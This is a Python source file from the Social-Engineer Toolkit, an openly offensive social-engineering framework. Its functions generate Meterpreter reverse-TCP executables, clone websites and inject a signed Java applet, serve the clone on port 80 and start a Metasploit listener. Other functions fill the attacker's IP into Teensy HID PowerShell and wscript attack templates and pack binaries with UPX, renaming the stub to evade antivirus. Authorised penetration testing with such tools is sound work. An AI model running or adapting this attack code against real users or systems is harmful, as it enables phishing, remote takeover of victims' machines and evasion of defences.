#!/usr/bin/env python
#
# Centralized classes, work in progress
# 
# This will ultimately hold all functions for SET
import re
import sys
import socket
import subprocess
import shutil
import os
import time
import datetime
import random
import string

# used to grab the true path for current working directory
definepath=os.getcwd()

#
# Class for colors
#
class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

    def disable(self):
        self.PURPLE = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''

#
# grab the metaspoit path
#
def meta_path():
    # DEFINE METASPLOIT PATH
    meta_path=file("%s/config/set_config" % (definepath),"r").readlines()
    for line in meta_path:
        line=line.rstrip()
        match=re.search("METASPLOIT_PATH=", line)
        if match:
            line=line.replace("METASPLOIT_PATH=","")
            msf_path=line.rstrip()
            # path for metasploit
            if not os.path.isdir(msf_path):
                # specific for backtrack5
                if os.path.isfile("/opt/framework3/msf3/msfconsole"):
                    msf_path = "/opt/framework3/msf3"
                if not os.path.isfile("/opt/framework3/msf3/msfconsole"):
                    msf_path = raw_input("[!] Metasploit path not found. Enter path to framework directory: ")
            return msf_path

#
# grab the interface ip address
#
def grab_ipaddress():
    try:
        fileopen=file("%s/config/set_config" % (definepath), "r").readlines()
        for line in fileopen:
            line=line.rstrip()
            match=re.search("AUTO_DETECT=ON", line)
            if match:
                try:
                    rhost=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    rhost.connect(('google.com', 0))
                    rhost.settimeout(2)
                    rhost=rhost.getsockname()[0]
                    return rhost
                except Exception:
                    rhost=raw_input("Enter your interface IP Address: ")
                    return rhost

        # if AUTO_DETECT=OFF prompt for IP Address
            match1=re.search("AUTO_DETECT=OFF", line)
            if match1:
                rhost=raw_input("Enter the IP address for the payload listener: ")
                return rhost

    except Exception,e: print "Something went wrong, printing error: " + str(e)

#
# check for pexpect
#
def check_pexpect():
    try:
        import pexpect
    except: 
        print "Error!!! PExpect is required in order to fully run SET"
        print "Please download and install PExpect: http://sourceforge.net/projects/pexpect/files/pexpect/Release%202.3/pexpect-2.3.tar.gz/download"
        print "Would you like SET to attempt to install it for you?"
        answer=raw_input("yes or no: ")
        if answer == "yes" or answer == "y":
            print "[*] Installing Pexpect"
            subprocess.Popen("wget http://downloads.sourceforge.net/project/pexpect/pexpect/Release%202.3/pexpect-2.3.tar.gz?use_mirror=hivelocity;tar -zxvf pexpect-2.3.tar.gz;cd pexpect-2.3/;python setup.py install", shell=True).wait()
            # clean up
            subprocess.Popen("rm -rf pexpect-2.3* 1> /dev/null 2> /dev/null", shell=True).wait()
            print "[*] Finished... Relaunch SET, if it doesn't work you, install manually."
            sys.exit(1)
        if answer == "no" or answer == 'n':
            sys.exit(1)
        else:
            print "Invalid response, exiting the Social-Engineer Toolkit.."
            sys.exit(1)

#
# check for beautifulsoup
#
# try import for BeautifulSoup, required for MLITM
def check_beautifulsoup():
    try:
        import BeautifulSoup
    except: 
        print "Error!!! BeautifulSoup is required in order to fully run SET"
        print "Please download and install BeautifulSoup: http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz"
        print "Would you like SET to attempt to install it for you?"
        answer=raw_input("yes or no: ")
    
        if answer == "yes" or answer == "y":
            print "[*] Installing BeautifulSoup..."
            subprocess.Popen("wget http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz;tar -zxvf BeautifulSoup-3.2.0.tar.gz;cd BeautifulSoup-*;python setup.py install", shell=True).wait()
            # clean up
            subprocess.Popen("rm -rf BeautifulSoup-* 1> /dev/null 2> /dev/null", shell=True).wait()
            print "[*] Finished... Relaunch SET, if it doesn't work for you, install manually."
            sys.exit(1)
    
        if answer == "no" or answer == "n":
            sys.exit()
        else:
            print "Invalid response, exiting the Social-Engineer Toolkit.."
            sys.exit(1)

# 
# cleanup old or stale files
#
def cleanup_routine():
    # Cleanup from prior use
    subprocess.Popen("rm -rf demoCA/ 1> /dev/null 2> /dev/null;rm newcert.pem 1> /dev/null 2> /dev/null;rm newreq.pem 1> /dev/null 2>/dev/null;rm src/program_junk/interfaces 1> /dev/null 2> /dev/null;rm src/html/*.exe 1> /dev/null 2> /dev/null;rm src/html/msf.exe 1> /dev/null 2> /dev/null;rm src/html/1msf.raw 1> /dev/null 2> /dev/null;rm src/html/2msf.raw 1> /dev/null 2> /dev/null;rm msf.exe 1> /dev/null 2> /dev/null;rm src/program_junk/* 1> /dev/null 2> /dev/null;rm src/html/unsigned/Signed_Update.jar 1> /dev/null 2> /dev/null;rm src/html/unsigned/mykeystore 1> /dev/null 2> /dev/null;rm src/html/index.html 1> /dev/null 2> /dev/null;rm src/html/1msf.exe 1> /dev/null 2> /dev/null;rm src/html/msf.exe 1> /dev/null 2> /dev/null;rm src/html/nix.bin 1> /dev/null 2> /dev/null;rm src/html/mac.bin 1> /dev/null 2> /dev/null;rm -rf src/program_junk/* 1> /dev/null 2> /dev/null;rm -rf src/webattack/web_clone/site/* 1> /dev/null 2> /dev/null;rm src/html/1msf.exe 1> /dev/null 2> /dev/null;rm src/html/msf.exe 1> /dev/null 2> /dev/null;rm src/html/index.html 1> /dev/null 2> /dev/null", shell=True).wait()
    # Restore Original Java Applet
    subprocess.Popen("cp src/html/Signed_Update.jar.orig src/html/Signed_Update.jar 1> /dev/null 2> /dev/null", shell=True).wait()

#
# Update Metasploit
#
def update_metasploit():
    print "Updating the Metasploit Framework...Be patient."
    meta_path=file("%s/config/set_config" % (definepath),"r").readlines()
    for line in meta_path:
        line=line.rstrip()
        match=re.search("METASPLOIT_PATH",line)
        if match:
            line=line.replace("METASPLOIT_PATH=","")
            meta_path=line
    svn_update=subprocess.Popen("cd %s/;svn update" % (meta_path), shell=True).wait()
    print "\nMetasploit has successfully updated!\n\n"
    pause=raw_input("Press enter to return to main menu.")

#
# Update The Social-Engineer Toolkit
#
def update_set():
    print ("Updating the Social-Engineer Toolkit, be patient...")
    subprocess.Popen("svn update", shell=True).wait()
    print ("The updating has finished, returning to main menu..")
    time.sleep(2)

#
# Pull the help menu here
#
def help_menu():
    fileopen=file("readme/README","r").readlines()
    for line in fileopen:
        line=line.rstrip()
        print line
    fileopen=file("readme/CREDITS", "r").readlines()
    print "\n"
    for line in fileopen:
        line=line.rstrip()
        print line
    pause=raw_input("\n\nPress return to enter the main menu.")


#
# This is a small area to generate the date and time
#
def date_time():
    now=datetime.datetime.today()

#
# generate a random string
#
def generate_random_string(low,high):
    length=random.randint(low,high)
    letters=string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string() #+"
    return rand_gen

#
# clone JUST a website, and export it.
# Will do no additional attacks.
#
def site_cloner(website,exportpath, *args):

    # grab the interface IP address
    grab_ipaddress()
    ipaddr=grab_ipaddress()
    
    # open up file for writing
    filewrite=file("src/program_junk/interface", "w")

    # write the ipaddress
    filewrite.write(ipaddr)

    # close the file
    filewrite.close()

    # write it to alternative path
    filewrite=file("src/program_junk/ipaddr", "w")

    # write the ipaddress
    filewrite.write(ipaddr)

    # close the file
    filewrite.close()

    # open up file to write for website address
    filewrite=file("src/program_junk/site.template", "w")

    # write out URL=websiteaddress.com
    filewrite.write("URL="+website)

    # close the file
    filewrite.close()

    # if we specify a second argument this means we want to use java applet
    if args[0] == "java":
        # needed to define attack vector
        filewrite=file("src/program_junk/attack_vector", "w")

        # write out the java applet attack vector
        filewrite.write("java")

        # close the file
        filewrite.close()

    # redirect system path to src/webattack/web_clone
    sys.path.append("src/webattack/web_clone")

    # if we are using menu mode we reload just in case
    try: reload(cloner)

    # import the cloner module from SET
    except: import cloner

    # copy the file to a new folder
    print "Site has been successfully cloned and is: " + exportpath
    subprocess.Popen("mkdir '%s' 1> /dev/null 2> /dev/null;cp src/webattack/web_clone/site/template/* '%s' 1> /dev/null 2> /dev/null" % (exportpath,exportpath), shell=True).wait()

#
# this will generate a meterpreter reverse payload (executable)
# with backdoored executable, digital signature stealing, and
# UPX encoded (if these options are enabled). It will automatically
# inherit the AUTO_DETECT=ON or OFF configuration.
#
# usage: metasploit_reverse_tcp_exe(portnumber)
# 
def meterpreter_reverse_tcp_exe(port):

    # grab the interface IP address
    ipaddr=grab_ipaddress()

    # open up file for writing
    filewrite=file("src/program_junk/interface", "w")

    # write the ipaddress
    filewrite.write(ipaddr)

    # close the file
    filewrite.close()

    # write it to alternative path
    filewrite=file("src/program_junk/ipaddr", "w")

    # write the ipaddress
    filewrite.write(ipaddr)

    # close the file
    filewrite.close()

    # write it to alternative path
    filewrite=file("src/program_junk/ipaddr.file", "w")

    # write the ipaddress
    filewrite.write(ipaddr)

    # close the file
    filewrite.close()

    # trigger a flag to be checked in payloadgen
    # if this flag is true, it will skip the questions
    filewrite=file("src/program_junk/meterpreter_reverse_tcp_exe", "w")
    filewrite.write(port)
    filewrite.close()

    # import the system path for payloadgen in SET
    sys.path.append("src/core/payloadgen")
    try: reload(create_payloads)
    except: import create_payloads


    random_value=generate_random_string(5,10)

    # copy the created executable to program_junk
    print "[*] Executable created under src/program_junk/%s.exe" % (random_value)
    subprocess.Popen("cp src/html/msf.exe src/program_junk/%s.exe 1> /dev/null 2>/dev/null" % (random_value), shell=True).wait() 


#
# Start a metasploit multi handler
#
def metasploit_listener_start(payload,port):
    
    # open a file for writing
    filewrite=file("%s/src/program_junk/msf_answerfile" % (definepath), "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload,port))
    # close the file
    filewrite.close()
    
    # launch msfconsole
    metasploit_path=meta_path()
    subprocess.Popen("%s/msfconsole -r %s/src/program_junk/msf_answerfile" % (metasploit_path,definepath), shell=True).wait()

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server(directory):

    try:
        # import the threading, socketserver, and simplehttpserver
        import thread,SocketServer,SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", 80),SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        thread.start_new_thread(httpd.serve_forever,())
        # change directory to the path we specify for output path
        os.chdir(directory)

    # handle keyboard interrupts
    except KeyboardInterrupt:
        print "[*] Exiting the SET web server...\n"
        httpd.socket.close()

    # handle the rest
    #except Exception: 
    #    print "[*] Exiting the SET web server...\n"
    #    httpd.socket.close()

#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack(website,port,directory):

    # create the payload
    meterpreter_reverse_tcp_exe(port)

    # clone the website and inject java applet
    site_cloner(website,directory,"java")

    # this part is needed to rename the msf.exe file to a randomly generated one
    if os.path.isfile("src/program_junk/rand_gen"):
        # open the file
        fileopen=file("src/program_junk/rand_gen", "r")
        # start a loop
        for line in fileopen:
            # define executable name and rename it
            filename=line.rstrip()
            # move the file to the specified directory and filename
            subprocess.Popen("cp src/html/msf.exe %s/%s 1> /dev/null 2> /dev/null" % (directory,filename), shell=True).wait()


    # lastly we need to copy over the signed applet
    subprocess.Popen("cp src/html/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (directory), shell=True).wait()

    # start the web server by running it in the background
    start_web_server(directory)

    # run multi handler for metasploit
    print ("[*] Starting the multi/handler through Metasploit...")
    metasploit_listener_start("windows/meterpreter/reverse_tcp",port)

#
# this will create a raw PDE file for you to use in your teensy device
#
#
def teensy_pde_generator(attack_method):


    # grab the ipaddress
    ipaddr=grab_ipaddress()

    # if we are doing the attack vector teensy beef
    if attack_method == "beef":
        # specify the filename
        filename=file("src/teensy/beef.pde", "r")
        filewrite=file("reports/beef.pde", "w")
        for line in filename:
            line=line.rstrip()
            match=re.search("IPADDR", line)
            if match:
                line=line.replace("IPADDR", ipaddr)
            filewrite.write(line)

        print ("[*] Successfully generated Teensy HID Beef Attack Vector under reports/beef.pde")

    # if we are doing the attack vector teensy beef
    if attack_method == "powershell_down":
        # specify the filename
        filename=file("src/teensy/powershell_down.pde", "r")
        filewrite=file("reports/powershell_down.pde", "w")
        for line in filename:
            line=line.rstrip()
            match=re.search("IPADDR", line)
            if match:
                line=line.replace("IPADDR", ipaddr)
            filewrite.write(line)

        print ("[*] Successfully generated Teensy HID Attack Vector under reports/powershell_down.pde")

    # if we are doing the attack vector teensy 
    if attack_method == "powershell_reverse":
        # specify the filename
        filename=file("src/teensy/powershell_reverse.pde", "r")
        filewrite=file("reports/powershell_reverse.pde", "w")
        for line in filename:
            line=line.rstrip()
            match=re.search("IPADDR", line)
            if match:
                line=line.replace("IPADDR", ipaddr)
            filewrite.write(line)

        print ("[*] Successfully generated Teensy HID Attack Vector under reports/powershell_reverse.pde")

    # if we are doing the attack vector teensy beef
    if attack_method == "java_applet":
        # specify the filename
        filename=file("src/teensy/java_applet.pde", "r")
        filewrite=file("reports/java_applet.pde", "w")
        for line in filename:
            line=line.rstrip()
            match=re.search("IPADDR", line)
            if match:
                line=line.replace("IPADDR", ipaddr)
            filewrite.write(line)

        print ("[*] Successfully generated Teensy HID Attack Vector under reports/java_applet.pde")

    # if we are doing the attack vector teensy 
    if attack_method == "wscript":
        # specify the filename
        filename=file("src/teensy/wscript.pde", "r")
        filewrite=file("reports/wscript.pde", "w")
        for line in filename:
            line=line.rstrip()
            match=re.search("IPADDR", line)
            if match:
                line=line.replace("IPADDR", ipaddr)
            filewrite.write(line)

        print ("[*] Successfully generated Teensy HID Attack Vector under reports/wscript.pde")

#
# Expand the filesystem windows directory
# 

def windows_root():
    return os.environ['WINDIR']

#
# core log file routine for SET
#
def log(error):
    # open log file only if directory is present (may be out of directory for some reason)
    if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)): 
        subprocess.Popen("touch src/logs/set_logfile.log", shell=True).wait()
    if os.path.isfile("%s/src/logs/" % (definepath)):
        # open file for writing
        filewrite=file("%s/src/logs/set_logfile.log" % (definepath), "a")
        # write error message out
        filewrite.write(error)
        # close the file
        filewrite.close()

#
# upx encoding and modify binary
#
def upx(path_to_file):
    # open the set_config
    fileopen=file("config/set_config", "r")
    for line in fileopen:
        line=line.rstrip()
        match=re.search("UPX_PATH=", line)
        if match:
            upx_path=line.replace("UPX_PATH=", "")
    
    # if it isn't there then bomb out
    if not os.path.isfile(upx_path):
        print "[!] UPX was not detected. Try configuring the set_config again."

    # if we detect it
    if os.path.isfile(upx_path):
        print "[*] Packing the executable and obfuscating PE file randomly, one moment."
        # packing executable
        subprocess.Popen("%s -9 -q -o src/program_junk/temp.binary %s 1> /dev/null 2> /dev/null" % (upx_path, path_to_file), shell=True).wait()
        # move it over the old file
        subprocess.Popen("mv src/program_junk/temp.binary %s 1> /dev/null 2> /dev/null" % (path_to_file), shell=True).wait()
        
        # random string
        random_string = generate_random_string(3,3).upper()

        # 4 upx replace - we replace 4 upx open the file
        fileopen = file(path_to_file, "rb")
        filewrite = file("src/program_junk/temp.binary", "wb")
        
        # read the file open for data
        data = fileopen.read()
        # replace UPX stub makes better evasion for A/V
        filewrite.write(data.replace("UPX", random_string, 4))
        filewrite.close()
        # copy the file over
        subprocess.Popen("mv src/program_junk/temp.binary %s 1> /dev/null 2> /dev/null" % (path_to_file), shell=True).wait()
    time.sleep(3)

def get_version():
    define_version=file("src/core/version", "r").readline()
    define_version=define_version.rstrip()
    return define_version


def show_banner(define_version,graphic):

    if graphic == "1":
        os.system("clear")
        show_graphic()
    else:
        os.system("clear")
    
    print bcolors.BLUE + """
  [---]       The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")          [---]
  [---]        Written by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
  [---]        Development Team: """ + bcolors.RED + """Thomas Werth""" + bcolors.BLUE + """            [---]
  [---]        Development Team: """ + bcolors.RED + """JR DePre (pr1me)""" + bcolors.BLUE + """        [---]
  [---]        Development Team: """ + bcolors.RED + """Joey Furr (j0fer)""" + bcolors.BLUE + """       [---]
  [---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
  [---]         Codename: '""" + bcolors.YELLOW + """Convergence Edition""" + bcolors.BLUE + """'          [---]
  [---]     Report """ + bcolors.RED +"""bugs""" + bcolors.BLUE + """ to:"""+ bcolors.GREEN + """ davek@social-engineer.org    """ + bcolors.BLUE+"""[---]
  [---]         Follow me on Twitter: """ + bcolors.PURPLE+ """dave_rel1k""" + bcolors.BLUE+"""         [---]
  [---]        Homepage: """ + bcolors.YELLOW + """http://www.secmaniac.com""" + bcolors.BLUE+"""        [---]
  [---]     Framework: """ + bcolors.YELLOW + """http://www.social-engineer.org""" + bcolors.BLUE+"""    [---]

""" + bcolors.GREEN+"""   Welcome to the Social-Engineer Toolkit (SET). Your one
    stop shop for all of your social-engineering needs..
    """ 
    print bcolors.BLUE + """    DerbyCon 2011 Sep30-Oct02 - http://www.derbycon.com.\n""" + bcolors.ENDC
    
def show_graphic():
    menu=random.randrange(1,7)
    if menu == 1:
        print bcolors.BLUE + r"""
                                              ,----,
                                            ,/   .`| 
                  .--.--.       ,---,.    ,`   .'  : 
                 /  /    '.   ,'  .' |  ;    ;     / 
                |  :  /`. / ,---.'   |.'___,/    ,'  
                ;  |  |--`  |   |   .'|    :     |   
                |  :  ;_    :   :  |-,;    |.';  ;   
                 \  \    `. :   |  ;/|`----'  |  |   
                  `----.   \|   :   .'    '   :  ;   
                  __ \  \  ||   |  |-,    |   |  '   
                 /  /`--'  /'   :  ;/|    '   :  |   
                '--'.     / |   |    \    ;   |.'    
                  `--'---'  |   :   .'    '---'      
                            |   | ,'                 
                            `----'                   """ +bcolors.ENDC
    if menu == 2:
        print bcolors.YELLOW + r"""
                         .--.  .--. .-----.
                        : .--': .--'`-. .-'
                        `. `. : `;    : :  
                         _`, :: :__   : :  
                        `.__.'`.__.'  :_;  
""" + bcolors.ENDC
    if menu == 3:
        print bcolors.GREEN + r"""
                  _______________________________
                 /   _____/\_   _____/\__    ___/
                 \_____  \  |    __)_   |    |   
                 /        \ |        \  |    |   
                /_______  //_______  /  |____|   
                        \/         \/         
                                                  """ + bcolors.ENDC
    if menu == 4:
        print bcolors.BLUE + r"""                                               
                 :::===  :::===== :::====
                 :::     :::      :::====
                  =====  ======     ===  
                     === ===        ===  
                 ======  ========   ===  
""" + bcolors.ENDC

    if menu == 5:
        print bcolors.RED + r"""
                ..######..########.########
                .##....##.##..........##...
                .##.......##..........##...
                ..######..######......##...
                .......##.##..........##...
                .##....##.##..........##...
                ..######..########....##...

""" + bcolors.ENDC

    if menu == 6:
        print bcolors.PURPLE + r'''
                 .M"""bgd `7MM"""YMM MMP""MM""YMM 
                ,MI    "Y   MM    `7 P'   MM   `7 
                `MMb.       MM   d        MM      
                  `YMMNq.   MMmmMM        MM      
                .     `MM   MM   Y  ,     MM      
                Mb     dM   MM     ,M     MM      
                P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC

    if menu == 7:
        print bcolors.YELLOW + r""" 
                ________________________
                __  ___/__  ____/__  __/
                _____ \__  __/  __  /   
                ____/ /_  /___  _  /    
                /____/ /_____/  /_/     """ + bcolors.ENDC
